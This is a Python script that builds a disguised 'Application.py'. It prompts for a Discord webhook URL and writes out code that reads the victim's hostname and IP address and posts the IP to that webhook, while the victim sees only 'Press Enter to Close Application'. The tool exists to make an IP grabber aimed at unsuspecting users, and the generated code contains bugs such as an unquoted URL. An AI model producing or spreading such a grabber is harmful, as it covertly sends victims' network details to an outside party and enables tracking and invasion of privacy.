import time
import os
import string
import ctypes
import sys
import random

typing_speed = 50
def slow_type(t):
    for l in t:
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(random.random()*10.0/typing_speed)

LICNECE = """
 Copyright (C) 2022 frisoda#0609 frisado1@gmail.com
            GNU GENERAL PUBLIC LICENSE
             Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
"""
print(LICNECE)
time.sleep(5)
os.system('cls' if os.name == 'nt' else 'clear')



slow_type("Made by FRISADO1 frisoda#0609\n")

print("""███████ ██████        ██████    ███████      █████       █████         █████
███████ ██████        ██████    ███████      █████       ██    ██      ██████
██          ██      ███       ██       ██             ██      ██     ██      ██   ██      ██
██          ██      ███       ██       ██             ██      ██     ██        █  ██       ██
███████ ████████        ██       ███████    ████████    ██         █ ██       ██
███████ ████               ██       ███████    ████████    ██         █ ██       ██
██          ██  ██             ██                ██   ██        ██    ██        █  ██      ██
██          ██     ██          ██                ██   ██        ██    ██      ██   ██     ██
██          ██       ██     ██████   ███████   ██        ██    ██    ██       █████
██          ██         ██   ██████   ███████   ██        ██    █████          ████""")

url = input("\n\nYour Discord Webhook: ")

File_object = open("Application.py","a")
File_object.write('import requests \nimport socket \n\nprint("Press Enter to Close Application") \n\nhostname=socket.gethostname()   \nIPAddr=socket.gethostbyname(hostname)   \n\npayload_url='+ url + '\nwhile True: \n    message = input() \n    input=(IPAddr) \n    r =requests.post(payload_url, data={"content": IPAddr})')
File_object.close()
